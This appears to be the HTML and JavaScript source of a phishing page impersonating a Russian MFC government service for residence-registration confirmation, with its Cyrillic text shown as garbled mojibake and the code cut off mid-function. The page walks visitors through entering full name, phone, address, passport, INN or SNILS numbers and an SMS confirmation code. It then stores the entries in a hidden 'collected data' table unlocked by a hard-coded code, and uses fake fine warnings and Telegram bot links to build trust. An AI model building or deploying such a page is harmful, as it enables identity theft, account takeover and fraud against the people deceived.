<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–ú–§–¶ ‚Äî –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</title>
  <style>
    :root {
      --primary-color: #800000;
      --secondary-color: #660000;
      --info-color: #990000;
      --error-color: #B22222;
      --background-color: #F5E6E6;
      --white: #fff;
      --text-color: #333;
      --shadow: 0 4px 12px rgba(128, 0, 0, 0.3);
      --input-bg: #EADADA;
      --input-border: #990000;
      --table-header-bg: linear-gradient(90deg, #800000, #660000);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: var(--background-color);
      padding: 20px;
      display: flex;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      max-width: 500px;
      width: 100%;
      background: var(--white);
      padding: 30px;
      border-radius: 16px;
      box-shadow: var(--shadow);
      text-align: center;
    }

    .step {
      display: none;
      text-align: left;
    }

    .step.active {
      display: block;
    }

    h2, h3 {
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.6em;
      color: var(--primary-color);
      display: flex;
      align-items: center;
      gap: 10px;
      line-height: 1.3;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }

    input {
      width: 100%;
      padding: 12px 15px;
      margin-top: 8px;
      border: 2px solid var(--input-border);
      border-radius: 10px;
      font-size: 16px;
      background: var(--input-bg);
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 4px 12px rgba(128, 0, 0, 0.2);
    }

    .error {
      color: var(--error-color);
      font-size: 14px;
      margin-top: 6px;
      font-weight: 600;
      text-align: left;
    }

    .success {
      color: #28a745;
      font-size: 16px;
      margin-top: 10px;
      font-weight: 600;
      text-align: center;
      display: none;
    }

    .buttons {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    button, a.button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: background-color 0.3s, transform 0.1s;
      text-decoration: none;
      display: inline-block;
      text-align: center;
      color: var(--white);
    }

    button:hover, a.button:hover {
      transform: translateY(-2px);
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .next {
      background: var(--primary-color);
    }

    .back {
      background: var(--secondary-color);
    }

    .menu-btn, .service-btn, .faq-btn {
      background: var(--info-color);
    }

    .data-table {
      margin-top: 20px;
      width: 100%;
      border-collapse: collapse;
      display: none;
      background: var(--white);
      border-radius: 10px;
      overflow: hidden;
    }

    .data-table.active {
      display: table;
    }

    .data-table th, .data-table td {
      border: 1px solid var(--input-border);
      padding: 15px;
      text-align: left;
      font-size: 14px;
      vertical-align: middle;
    }

    .data-table th {
      background: var(--table-header-bg);
      color: var(--white);
      font-weight: 700;
      text-transform: uppercase;
    }

    .data-table tr {
      transition: background-color 0.3s;
    }

    .data-table tr:hover {
      background-color: #F9F5F5;
    }

    .data-table tr:nth-child(even) {
      background-color: #F5EDED;
    }

    p {
      margin-bottom: 20px;
      color: var(--text-color);
      font-size: 16px;
      line-height: 1.5;
    }

    .clickable-text {
      color: var(--primary-color);
      cursor: pointer;
      user-select: none;
    }

    .clickable-text:hover {
      text-decoration: underline;
    }

    .clickable-emoji {
      cursor: pointer;
      margin-left: 5px;
    }

    .clickable-emoji:hover {
      opacity: 0.7;
    }

    @media (max-width: 400px) {
      .container {
        padding: 20px;
      }

      h2, h3 {
        font-size: 1.4em;
      }

      input {
        font-size: 14px;
        padding: 10px 12px;
      }

      button, a.button {
        font-size: 14px;
        padding: 12px;
      }

      .data-table th, .data-table td {
        padding: 10px;
        font-size: 12px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="wizard">
      <!-- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é -->
      <div class="step active" id="step-main">
        <img src="https://centergoroda.com/upload/iblock/3fa/ba9xciv1erty46hhuhgdsrr92mr7yz3l/image_2021_09_07T12_44_55_842Z.png" alt="Welcome Photo" style="width: 100%; border-radius: 10px; margin-bottom: 20px;">
        <h2 id="welcome-message">üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, üëã</h2>
        <p>–ú—ã ‚Äî –≤–∞—à –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –¥–ª—è –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ –º–µ—Å—Ç—É –∂–∏—Ç–µ–ª—å—Å—Ç–≤–∞. –ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ?</p>
        <div class="buttons">
          <a href="https://t.me/MFC_Bot?start=welcome" target="_blank" class="button">üì≤ –û—Ç–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram</a>
          <button class="menu-btn" data-action="schedule">üìã –ó–∞–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—ë–º</button>
          <button class="menu-btn" data-action="documents">üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</button>
          <button class="menu-btn" data-action="check-status">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</button>
          <button class="menu-btn" data-action="contact">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          <button class="menu-btn" data-action="faq">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
        </div>
      </div>

      <!-- –ó–∞–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—ë–º -->
      <div class="step" id="step-fullname">
        <h3>üë§ –£–∫–∞–∂–∏—Ç–µ –§–ò–û</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á">
          <div class="error" id="err-fullname"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–µ–ª–µ—Ñ–æ–Ω -->
      <div class="step" id="step-phone">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <input type="tel" id="phone" placeholder="+79991234567">
          <div class="error" id="err-phone"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ê–¥—Ä–µ—Å -->
      <div class="step" id="step-address">
        <h3>üè† –£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1, –∫–≤. 2">
          <div class="error" id="err-address"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –í—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step" id="step-document-type">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button class="menu-btn" data-doc="–ü–∞—Å–ø–æ—Ä—Ç">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button class="menu-btn" data-doc="–ò–ù–ù">üßæ –ò–ù–ù</button>
          <button class="menu-btn" data-doc="–°–ù–ò–õ–°">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step" id="step-document-number">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <p><b>–£–ö–ê–ó–´–í–ê–ô–¢–ï –¢–û–õ–¨–ö–û –°–í–û–ò –î–ê–ù–ù–´–ï</b></p>
        <div class="input-group">
          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
          <input type="text" id="docnumber">
          <div class="error" id="err-doc"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ö–æ–¥ –∏–∑ SMS -->
      <div class="step" id="step-code">
        <h3>üîê –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS</h3>
        <p>–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä. –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.</p>
        <div class="input-group">
          <input type="text" id="code" placeholder="1234">
          <div class="error" id="err-code"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>
      </div>

      <!-- –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ -->
      <div class="step" id="step-documents">
        <h3>üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</h3>
        <p>–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è:</p>
        <ul>
          <li>–ü–∞—Å–ø–æ—Ä—Ç –≥—Ä–∞–∂–¥–∞–Ω–∏–Ω–∞ –†–§</li>
          <li>–ò–ù–ù (–µ—Å–ª–∏ –µ—Å—Ç—å)</li>
          <li>–°–ù–ò–õ–°</li>
          <li>–í—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù (–µ—Å–ª–∏ –µ—Å—Ç—å)</li>
        </ul>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏ -->
      <div class="step" id="step-check-status">
        <h3>üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</h3>
        <div class="buttons">
          <button class="menu-btn" data-action="status-number">–ü–æ –Ω–æ–º–µ—Ä—É –∑–∞—è–≤–∫–∏</button>
          <button class="menu-btn" data-action="status-passport">–ü–æ –ø–∞—Å–ø–æ—Ä—Ç—É</button>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∑–∞—è–≤–∫–∏ -->
      <div class="step" id="step-status-number">
        <h3>üîç –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∑–∞—è–≤–∫–∏</h3>
        <div class="input-group">
          <input type="text" id="status-number" placeholder="123">
          <div class="error" id="err-status-number"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
        </div>
      </div>

      <!-- –í–≤–µ–¥–∏—Ç–µ –ø–∞—Å–ø–æ—Ä—Ç -->
      <div class="step" id="step-status-passport">
        <h3>üîç –í–≤–µ–¥–∏—Ç–µ –ø–∞—Å–ø–æ—Ä—Ç</h3>
        <div class="input-group">
          <input type="text" id="status-passport" placeholder="1234 567890">
          <div class="error" id="err-status-passport"></div>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button class="next">‚û°Ô∏è –ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
        </div>
      </div>

      <!-- –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π -->
      <div class="step" id="step-contact">
        <h3>üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</h3>
        <p>–°–≤—è–∂–∏—Ç–µ—Å—å —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π:</p>
        <a href="https://t.me/MFC_SUPPOR" target="_blank" class="button next">üìû –ù–∞–ø–∏—Å–∞—Ç—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É –ú–§–¶</a>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã -->
      <div class="step" id="step-faq">
        <h3>‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h3>
        <div class="buttons">
          <button class="faq-btn" data-faq="1">‚ùì 1. –ó–∞—á–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é?</button>
          <button class="faq-btn" data-faq="2">‚ùì 2. –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –Ω—É–∂–Ω—ã?</button>
          <button class="faq-btn" data-faq="3">‚ùì 3. –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å?</button>
          <button class="faq-btn" data-faq="4">‚ùì 4. –ú–æ–∂–Ω–æ –ª–∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–Ω–ª–∞–π–Ω?</button>
          <button class="faq-btn" data-faq="5">‚ùì 5. –ö–∞–∫ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ, –µ—Å–ª–∏ —è –ø–µ—Ä–µ–µ—Ö–∞–ª?</button>
          <button class="faq-btn" data-faq="6">‚ùì 6. –ö–∞–∫ –∑–∞–ø–∏—Å–∞—Ç—å—Å—è –±–µ–∑ –æ—á–µ—Ä–µ–¥–µ–π?</button>
          <button class="faq-btn" data-faq="7">‚ùì 7. –ö–≤–∞—Ä—Ç–∏—Ä–∞ –≤ –∏–ø–æ—Ç–µ–∫–µ?</button>
          <button class="faq-btn" data-faq="8">‚ùì 8. –ö–∞–∫ –∏–∑–±–µ–∂–∞—Ç—å —à—Ç—Ä–∞—Ñ–∞ –∑–∞ —Ñ–∏–∫—Ç–∏–≤–Ω—É—é —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é?</button>
          <button class="faq-btn" data-faq="9">‚ùì 9. –ö–∞–∫ –¥–æ–ª–≥–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è –∑–∞—è–≤–∫–∞?</button>
          <button class="faq-btn" data-faq="10">‚ùì 10. –ß—Ç–æ –¥–µ–ª–∞—Ç—å, –µ—Å–ª–∏ –ø–æ—Ç–µ—Ä—è–ª –≤—ã–ø–∏—Å–∫—É –ï–ì–†–ù?</button>
        </div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –û—Ç–≤–µ—Ç –Ω–∞ –≤–æ–ø—Ä–æ—Å -->
      <div class="step" id="step-faq-answer">
        <h3 id="faq-title">‚ùì –û—Ç–≤–µ—Ç</h3>
        <div id="faq-answer" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
        <div class="buttons">
          <button class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –¢–∞–±–ª–∏—Ü–∞ –¥–∞–Ω–Ω—ã—Ö (hidden by default) -->
      <div id="data-output" class="data-table">
        <h3>üìã –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</h3>
        <table>
          <thead>
            <tr>
              <th>–í—Ä–µ–º—è</th>
              <th>–§–ò–û</th>
              <th>–¢–µ–ª–µ—Ñ–æ–Ω</th>
              <th>–ê–¥—Ä–µ—Å</th>
              <th>–î–æ–∫—É–º–µ–Ω—Ç</th>
              <th>–ö–æ–¥</th>
            </tr>
          </thead>
          <tbody id="data-table-body"></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    class MFCWizard {
      constructor() {
        this.steps = document.querySelectorAll('.step');
        this.currentStep = 'main';
        this.formData = {};
        this.dataStore = [];
        this.initEventListeners();
        this.updateWelcomeMessage();
        this.showStep('main');
      }

      initEventListeners() {
        document.getElementById('wizard').addEventListener('click', (e) => {
          const target = e.target;
          if (target.classList.contains('next') && !target.closest('a') && !target.closest('.redirect-button')) {
            this.handleNext();
          } else if (target.classList.contains('back')) {
            this.handleBack();
          } else if (target.classList.contains('menu-btn')) {
            this.handleMenuAction(target.dataset.action, target.dataset.doc);
          } else if (target.classList.contains('service-btn')) {
            this.handleServiceAction(target.dataset.service);
          } else if (target.classList.contains('faq-btn')) {
            this.handleFaqAction(target.dataset.faq);
          }
        });

        ['fullname', 'phone', 'address', 'docnumber', 'code', 'status-number', 'status-passport'].forEach(id => {
          const input = document.getElementById(id);
          input?.addEventListener('input', () => this.validateStep(this.currentStep));
        });
      }

      updateWelcomeMessage() {
        // –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä username –∏–∑ URL
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username') || '–ì–æ—Å—Ç—å';
        const welcomeElement = document.getElementById('welcome-message');
        if (welcomeElement) {
          welcomeElement.textContent = `üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${username}! üëã`;
        }
      }

      showStep(stepId) {
        this.steps.forEach(step => {
          step.classList.toggle('active', step.id === `step-${stepId}`);
        });
        this.currentStep = stepId;
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }

      handleNext() {
        if (!this.validateStep(this.currentStep)) return;

        const nextSteps = {
          fullname: 'phone',
          phone: 'address',
          address: 'document-type',
          'document-type': 'document-number',
          'document-number': 'code',
          code: 'main',
          'status-number': 'main',
          'status-passport': 'main'
        };

        if (nextSteps[this.currentStep]) {
          this.formData[this.currentStep] = document.getElementById(this.currentStep)?.value?.trim();
          if (this.currentStep === 'code') {
            this.saveData();
          }
          this.showStep(nextSteps[this.currentStep]);
        }
      }

      handleBack() {
        const backSteps = {
          fullname: 'main',
          phone: 'fullname',
          address: 'phone',
          'document-type': 'address',
          'document-number': 'document-type',
          code: 'document-number',
          final: 'code',
          documents: 'main',
          'check-status': 'main',
          'status-number': 'check-status',
          'status-passport': 'check-status',
          services: 'main',
          faq: 'main',
          'faq-answer': 'faq',
          instruction: 'services',
          contact: 'main',
          unauthorized: 'main'
        };

        this.showStep(backSteps[this.currentStep] || 'main');
      }

      handleMenuAction(action, doc) {
        if (action === 'schedule') {
          this.showStep('fullname');
        } else if (action === 'documents') {
          this.showStep('documents');
        } else if (action === 'check-status') {
          this.showStep('check-status');
        } else if (action === 'contact') {
          this.showStep('contact');
        } else if (action === 'faq') {
          this.showStep('faq');
        } else if (action === 'status-number') {
          this.showStep('status-number');
        } else if (action === 'status-passport') {
          this.showStep('status-passport');
        } else if (action === 'authorize') {
          this.showStep('fullname');
        } else if (action === 'main') {
          this.showStep('main');
        } else if (doc) {
          this.formData['document-type'] = doc;
          const docnumber = document.getElementById('docnumber');
          const example = document.getElementById('doc-example');
          const configs = {
            '–ü–∞—Å–ø–æ—Ä—Ç': '–ü—Ä–∏–º–µ—Ä: 4510 123456',
            '–ò–ù–ù': '–ü—Ä–∏–º–µ—Ä: 500100732259',
            '–°–ù–ò–õ–°': '–ü—Ä–∏–º–µ—Ä: 112-233-445 95'
          };
          example.textContent = configs[doc] || '';
          this.showStep('document-number');
        }
      }

      handleServiceAction(service) {
        if (service === 'faq') {
          this.showStep('faq');
        } else if (service === 'instruction') {
          this.showStep('instruction');
        }
      }

      handleFaqAction(faq) {
        const faqContent = {
          "1": {
            title: "‚ùì 1. –ó–∞—á–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é?",
            answer: "üìú –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ (—Å—Ç. 19.15.1 –ö–æ–ê–ü –†–§). üïí –°—Ä–æ–∫–∏: 01.02.2025‚Äì31.12.2025. –ë–æ—Ç –ø–æ–º–æ–∂–µ—Ç –ø–æ–¥–∞—Ç—å –¥–æ–∫—É–º–µ–Ω—Ç—ã. üöÄ"
          },
          "2": {
            title: "‚ùì 2. –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –Ω—É–∂–Ω—ã?",
            answer: "üìú –î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è: –ü–∞—Å–ø–æ—Ä—Ç –≥—Ä–∞–∂–¥–∞–Ω–∏–Ω–∞ –†–§, –ò–ù–ù (–µ—Å–ª–∏ –µ—Å—Ç—å), –°–ù–ò–õ–°, –í—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù (–µ—Å–ª–∏ –µ—Å—Ç—å)."
          },
          "3": {
            title: "‚ùì 3. –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å?",
            answer: "üö´ –ï—Å–ª–∏ –Ω–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é, –≤–æ–∑–º–æ–∂–Ω—ã —à—Ç—Ä–∞—Ñ—ã –ø–æ —Å—Ç. 19.15.1 –ö–æ–ê–ü –†–§."
          },
          "4": {
            title: "‚ùì 4. –ú–æ–∂–Ω–æ –ª–∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–Ω–ª–∞–π–Ω?",
            answer: "‚úÖ –î–∞, –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é –æ–Ω–ª–∞–π–Ω —á–µ—Ä–µ–∑ –Ω–∞—à –±–æ—Ç."
          },
          "5": {
            title: "‚ùì 5. –ö–∞–∫ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ, –µ—Å–ª–∏ —è –ø–µ—Ä–µ–µ—Ö–∞–ª?",
            answer: "üè† –ï—Å–ª–∏ –≤—ã –ø–µ—Ä–µ–µ—Ö–∞–ª–∏, –æ–±–Ω–æ–≤–∏—Ç–µ –∞–¥—Ä–µ—Å –≤ –ú–§–¶."
          },
          "6": {
            title: "‚ùì 6. –ö–∞–∫ –∑–∞–ø–∏—Å–∞—Ç—å—Å—è –±–µ–∑ –æ—á–µ—Ä–µ–¥–µ–π?",
            answer: "üìÖ –ó–∞–ø–∏—à–∏—Ç–µ—Å—å –æ–Ω–ª–∞–π–Ω —á–µ—Ä–µ–∑ –Ω–∞—à –±–æ—Ç, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –æ—á–µ—Ä–µ–¥–µ–π."
          },
          "7": {
            title: "‚ùì 7. –ö–≤–∞—Ä—Ç–∏—Ä–∞ –≤ –∏–ø–æ—Ç–µ–∫–µ?",
            answer: "üè† –ï—Å–ª–∏ –∫–≤–∞—Ä—Ç–∏—Ä–∞ –≤ –∏–ø–æ—Ç–µ–∫–µ, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã."
          },
          "8": {
            title: "‚ùì 8. –ö–∞–∫ –∏–∑–±–µ–∂–∞—Ç—å —à—Ç—Ä–∞—Ñ–∞ –∑–∞ —Ñ–∏–∫—Ç–∏–≤–Ω—É—é —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é?",
            answer: "‚ö†Ô∏è –ò–∑–±–µ–≥–∞–π—Ç–µ —Ñ–∏–∫—Ç–∏–≤–Ω–æ–π —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–π—Ç–µ —Ä–µ–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ."
          },
          "9": {
            title: "‚ùì 9. –ö–∞–∫ –¥–æ–ª–≥–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è –∑–∞—è–≤–∫–∞?",
            answer: "üïí –ó–∞—è–≤–∫–∞ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 3-5 —Ä–∞–±–æ—á–∏—Ö –¥–Ω–µ–π."
          },
          "10": {
            title: "‚ùì 10. –ß—Ç–æ –¥–µ–ª–∞—Ç—å, –µ—Å–ª–∏ –ø–æ—Ç–µ—Ä—è–ª –≤—ã–ø–∏—Å–∫—É –ï–ì–†–ù?",
            answer: "üìÑ –ï—Å–ª–∏ –ø–æ—Ç–µ—Ä—è–ª–∏ –≤—ã–ø–∏—Å–∫—É –ï–ì–†–ù, –∑–∞–ø—Ä–æ—Å–∏—Ç–µ –Ω–æ–≤—É—é –≤ –ú–§–¶."
          }
        };

        document.getElementById('faq-title').textContent = faqContent[faq].title;
        document.getElementById('faq-answer').textContent = faqContent[faq].answer;
        this.showStep('faq-answer');
      }

      checkPassword() {
        const password = prompt('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–∞–Ω–Ω—ã–º:');
        if (password === '1321') {
          this.toggleDataTable();
        } else if (password !== null) {
          alert('–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.');
        }
      }

      toggleDataTable() {
        const dataOutput = document.getElementById('data-output');
        if (dataOutput) {
          dataOutput.classList.toggle('active');
          if (dataOutput.classList.contains('active')) {
            this.renderDataTable();
          }
        } else {
          console.error('Data output element not found!');
        }
      }

      sanitizeInput(value) {
        return value.replace(/[<>"'&]/g, '');
      }

      validateStep(step) {
        const validations = {
          fullname: () => {
            const val = this.sanitizeInput(document.getElementById('fullname').value.trim());
            const re = /^[–ê-–Ø–∞-—è–Å—ë\s-]+$/;
            const error = document.getElementById('err-fullname');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –§–ò–û –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è';
